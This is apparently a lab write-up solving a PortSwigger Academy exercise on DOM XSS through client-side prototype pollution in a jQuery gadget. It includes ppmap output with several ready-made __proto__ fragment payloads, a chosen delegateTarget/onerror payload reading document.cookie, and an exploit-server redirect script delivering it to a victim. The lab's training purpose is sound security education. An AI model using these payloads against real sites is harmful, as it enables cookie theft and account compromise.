## Client-side prototype pollution in third-party libraries

This lab is vulnerable to DOM XSS via client-side prototype pollution. This is due to a gadget in a third-party library, which is easy to miss due to the minified source code. Although it's technically possible to solve this lab manually, we recommend using DOM Invader as this will save you a considerable amount of time and effort.

To solve the lab:

1. Use DOM Invader to identify a prototype pollution and a gadget for DOM XSS.
2. Use the provided exploit server to deliver a payload to the victim that calls alert(document.cookie) in their browser.

This lab is based on real-world vulnerabilities discovered by PortSwigger Research. For more details, check out Widespread prototype pollution gadgets by Gareth Heyes.

## Notes

- Exploit server
- Possibility to leave a comment
- Feedback feature on /feedback
- /filter?category=parameter
- /product/stock
- /resources/js/stockCheck.js
- /resources/js/jquery_1-7-1.js
- ws on /chat
- /ga.js
- /jquery_ba_bbq.js

## Resume

1. Use pphack to find the prototype pollution
2. Update the payload and store it on exploit server
3. Deliver the exploit

## Solve

Using another tool to cover the enumeration part, [ppmap](https://github.com/kleiton0x00/ppmap) :

```bash
┌──(kali㉿kali)-[~/Burpsuite-Professional]
└─$ echo "https://0aa9007403f35b5c804e4e1400960031.web-security-academy.net/" | ppmap
                                                                                
    dMMMMb  dMMMMb  dMMMMMMMMb  .aMMMb  dMMMMb      v1.2.0
   dMP.dMP dMP.dMP dMP"dMP"dMP dMP"dMP dMP.dMP 
  dMMMMP" dMMMMP" dMP dMP dMP dMMMMMP dMMMMP"  
 dMP     dMP     dMP dMP dMP dMP dMP dMP           
dMP     dMP     dMP dMP dMP dMP dMP dMP            @kleiton0x7e


                                              
2026/06/01 11:12:47 [ERRO] [https://0aa9007403f35b5c804e4e1400960031.web-security-academy.net/?constructor%5Bprototype%5D%5Bppmap%5D=reserved](https://0aa9007403f35b5c804e4e1400960031.web-security-academy.net/?constructor%5Bprototype%5D%5Bppmap%5D=reserved)
2026/06/01 11:12:53 [ERRO] [https://0aa9007403f35b5c804e4e1400960031.web-security-academy.net/?__proto__.ppmap=reserved](https://0aa9007403f35b5c804e4e1400960031.web-security-academy.net/?__proto__.ppmap=reserved)
2026/06/01 11:12:59 [ERRO] [https://0aa9007403f35b5c804e4e1400960031.web-security-academy.net/?constructor.prototype.ppmap=reserved](https://0aa9007403f35b5c804e4e1400960031.web-security-academy.net/?constructor.prototype.ppmap=reserved)
2026/06/01 11:13:05 [ERRO] [https://0aa9007403f35b5c804e4e1400960031.web-security-academy.net/?__proto__%5Bppmap%5D=reserved](https://0aa9007403f35b5c804e4e1400960031.web-security-academy.net/?__proto__%5Bppmap%5D=reserved)
2026/06/01 11:13:11 [VULN] [https://0aa9007403f35b5c804e4e1400960031.web-security-academy.net/#constructor%5Bprototype%5D%5Bppmap%5D=reserved](https://0aa9007403f35b5c804e4e1400960031.web-security-academy.net/#constructor%5Bprototype%5D%5Bppmap%5D=reserved)
2026/06/01 11:13:12 [INFO] Fingerprinting the gadget...
2026/06/01 11:13:17 [INFO] Gadget found: jQuery
2026/06/01 11:13:19 [INFO] Displaying all possible payloads
2026/06/01 11:13:19 [EXPL] Final payload: https://0aa9007403f35b5c804e4e1400960031.web-security-academy.net/#__proto__[context]=<img/src/onerror%3dalert(1)>&__proto__[jquery]=x
2026/06/01 11:13:19 [EXPL] Final payload: https://0aa9007403f35b5c804e4e1400960031.web-security-academy.net/#__proto__[url][]=data:,alert(1)//&__proto__[dataType]=script
2026/06/01 11:13:19 [EXPL] Final payload: https://0aa9007403f35b5c804e4e1400960031.web-security-academy.net/#__proto__[url]=data:,alert(1)//&__proto__[dataType]=script&__proto__[crossDomain]=
2026/06/01 11:13:19 [EXPL] Final payload: https://0aa9007403f35b5c804e4e1400960031.web-security-academy.net/#__proto__[src][]=data:,alert(1)//
2026/06/01 11:13:19 [EXPL] Final payload: https://0aa9007403f35b5c804e4e1400960031.web-security-academy.net/#__proto__[url]=data:,alert(1)//
2026/06/01 11:13:19 [EXPL] Final payload: https://0aa9007403f35b5c804e4e1400960031.web-security-academy.net/#__proto__[div]=1&__proto__[div]=<img/src/onerror%3dalert(1)>&__proto__[div]=1
2026/06/01 11:13:19 [EXPL] Final payload: https://0aa9007403f35b5c804e4e1400960031.web-security-academy.net/#__proto__[preventDefault]=x&__proto__[handleObj]=x&__proto__[delegateTarget]=<img/src/onerror%3dalert(1)>
```

The important observation from `ppmap` is that the lab is polluted through the URL fragment, and the gadget fingerprint points to jQuery rather than a direct browser API sink.

XSS payload :

```http
GET /#__proto__[preventDefault]=x&__proto__[handleObj]=x&__proto__[delegateTarget]=<img/src/onerror%3dalert(document.cookie)>
```

This payload works because the jQuery event flow reads inherited prototype properties and later uses them in a context that ends up creating HTML from attacker-controlled data. The `delegateTarget` value is the part that matters for execution.

Store the payload on **Exploit server** :

```js
<script>
document.location='https://0aa9007403f35b5c804e4e1400960031.web-security-academy.net/#__proto__[preventDefault]=x&__proto__[handleObj]=x&__proto__[delegateTarget]=%3Cimg/src/onerror%3dalert(document.cookie)%3E'
</script>
```

The exploit server payload simply forces the victim to visit the lab with the malicious fragment already present. Once the page loads, the polluted prototype values are consumed by the jQuery gadget, the HTML injection happens, and the `onerror` handler executes the JavaScript.

